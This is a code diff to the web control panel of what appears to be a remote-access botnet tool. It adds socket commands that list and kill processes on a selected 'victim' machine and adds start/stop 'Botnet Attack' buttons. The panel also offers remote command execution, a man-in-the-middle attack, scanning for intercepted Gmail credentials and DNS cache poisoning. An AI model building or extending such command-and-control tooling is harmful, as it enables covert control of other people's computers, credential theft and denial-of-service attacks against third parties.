@@ -62,6 +62,24 @@
 
 
 
+
+    //apps
+     $("#viewapp").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'ps -Al' }, function (data) {
+              
+                $("#lg-op-body").html(data);
+                $("#lg-op").modal('show');
+          });
+      });
+
+      $("#killapp").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'killall -9 ' + $("#killappid").val() }, function (data) {
+              alert("App killed!");
+          });
+      });
+
+
+
     //Messages
 
      $("#zenity").on('click', function() { 
@@ -216,7 +234,9 @@
     <div class="col-sm-4" id="operations">
         
       <h3>Remote Commands</h3>
-        <input id="cmdinput" placeholder="Enter command"></input><br/><br/><button id="runcmd">Execute on remote computer</button> 
+        <input id="cmdinput" placeholder="Enter command"></input><button id="runcmd">Execute</button><br/> <br/>  
+        <button id="viewapp">View running processes</button> <br/> <br/>  
+        <input id="killappid" placeholder="Enter app-process-name"></input><button id="killapp">Kill Application</button>
     </div>
 
     <div class="col-sm-8" id="operations">
@@ -225,6 +245,10 @@
         <button id="mitmdo">Man In the Middle Attack</button><br/><br/>  
         <button id="checkpass">MITM - Scan for intercepted Gmail Cred.</button><br/><br/>  
         <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
+        
+        <input id="botnetip" placeholder="IP address"></input>
+        <button id="botnet">Start Botnet Attack</button> 
+        <button id="botnet">Stop Botnet Attack</button><br/> <br/> 
     </div>
 
   </div>
@@ -252,8 +276,6 @@
         <input id="ffport" placeholder="Port"></input>
         <button id="proxychange">Change Proxy Settings</button> <br/> <br/> 
 
-        <input id="botnetip" placeholder="IP address"></input>
-        <button id="botnet">Botnet Attack</button> <br/> <br/> 
 
         <input id="resolvedit" placeholder="Enter text.."></input>
         <button id="resolvview">View DNS Resolver Cache</button> <br/> <br/> 
@@ -291,6 +313,23 @@
         </div>
         <div class="modal-body">
           <p id="screen-op-body"></p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal fade" id="lg-op" role="dialog">
+    <div class="modal-dialog modal-lg">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Info</h4>
+        </div>
+        <div class="modal-body">
+          <pre id="lg-op-body"></pre>
         </div>
         <div class="modal-footer">
           <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
